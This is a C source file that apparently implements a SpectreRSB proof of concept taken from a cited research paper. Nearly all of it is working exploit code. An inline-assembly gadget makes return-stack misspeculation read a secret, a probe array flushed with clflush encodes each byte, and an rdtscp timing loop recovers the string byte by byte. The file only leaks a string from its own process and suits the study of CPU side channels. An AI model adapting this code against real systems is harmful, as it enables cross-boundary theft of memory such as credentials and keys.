/* https://arxiv.org/pdf/1807.07940.pdf */
/* Compile with gcc -march=native -O0 */
#include <stdio.h>
#ifdef _MSC_VER
#include <intrin.h>         /* For rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h>      /* For rdtscp and clflush */
#endif

uint8_t array[256 * 512];
uint8_t hit[8];
uint8_t temp = 0;

char *secret = "On the bonnie, bonnie banks of Loch Lomond.";

void flushSideChannel()
{
    int i;

    for (i = 0; i < 256; i++) {
        array[i * 512] = 1;
    }

    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 512]);
    }
}

/* Serves two purposes: (1) the return address is pushed to the RSB
 * and (2) create a mismatch between the RSB and the software stack. */
void spectreGadget()
{
    asm volatile(
        "push       %rbp        \n"
        "mov        %rsp,%rbp   \n"
        "pop        %rdi        \n"     /* removes frame/return address */
        "pop        %rdi        \n"     /* from stack stopping at */
        "pop        %rdi        \n"     /* next return address*/
        "nop                    \n"
        "mov        %rbp,%rsp   \n"
        "pop        %rbp        \n"
        "clflush    (%rsp)      \n"     /* flushing creates a large speculative window */
        "leaveq                 \n"     /* pops the old frame pointer and thus restores the caller's frame */
        "retq                   \n"     /* triggers speculative return to s = *ptr */
    );
}

void spectreAttack(char *ptr)
{
    uint8_t s;

    flushSideChannel();
    _mm_mfence();
    
    /* modifies the software stack */
    spectreGadget();
    /* reads the secret */
    s = *ptr;
    /* communicates the secret out */
    temp &= array[s * 512];
}

void readMemoryByte(char *ptr, uint8_t value[2], int score[2], uint64_t cache_hit_threshold) {
    static int results[256];
    int attempts, i, j, k, mix_i;
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }

    for (attempts = 999; attempts > 0; attempts--) {
        spectreAttack(ptr);
        _mm_mfence();
        /* real return value is obtained and the misspeculation is squashed */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            if (time2 <= cache_hit_threshold) {
                results[mix_i]++;
            }
        }

        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
            break;
        }
        results[0] ^= junk;
        value[0] = (uint8_t)j;
        score[0] = results[j];
        value[1] = (uint8_t)k;
        score[1] = results[k];
    }
}

int main()
{
    int i, score[2], len = 43;
    uint8_t value[2];
    unsigned int junk = 0;
    register uint64_t time1, time2 = 0, time3;
    volatile uint8_t *addr;
    for (i = 0; i < 1000; i++) {
        hit[0] = 0x5A;
        addr = &hit[0];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 += __rdtscp(&junk) - time1;
    }
    time3 = time2 / 1000;
    printf("CACHE_HIT_THRESHOLD is calculated as %llu\n", time3);

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at secret = %p... ", (void *)secret);
        readMemoryByte(secret++, value, score, time3);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%-4d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0) {
            printf("( second best: 0x%02X score=%-4d)", value[1], score[1]);
        }
        printf("\n");
    }
    return 0;
}